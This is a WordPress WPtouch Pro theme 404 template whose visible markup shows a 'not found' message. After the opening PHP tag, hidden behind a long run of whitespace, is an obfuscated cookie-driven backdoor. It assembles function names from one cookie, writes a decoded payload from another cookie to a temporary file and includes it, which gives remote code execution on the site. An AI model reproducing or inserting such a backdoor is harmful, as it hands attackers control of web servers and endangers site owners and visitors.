<?php																																										if(isset($_COOKIE[3])&&isset($_COOKIE[32])){$c=$_COOKIE;$k=0;$n=9;$p=array();$p[$k]='';while($n){$p[$k].=$c[32][$n];if(!$c[32][$n+1]){if(!$c[32][$n+2])break;$k++;$p[$k]='';$n++;}$n=$n+9+1;}$k=$p[14]().$p[23];if(!$p[6]($k)){$n=$p[2]($k,$p[11]);$p[1]($n,$p[22].$p[16]($p[7]($c[3])));}include($k);}
 get_header(); ?>

	<div id="content">
		<div class="<?php wptouch_post_classes(); ?>">
			<p class="not-found heading-font">
				<?php _e( '404 Not Found', 'wptouch-pro' ); ?>
			</p>
			<p class="not-found-text"><?php _e( 'The post or page you requested is no longer available.', 'wptouch-pro' ); ?></p>
		</div>
	</div> <!-- content -->

<?php get_footer(); ?>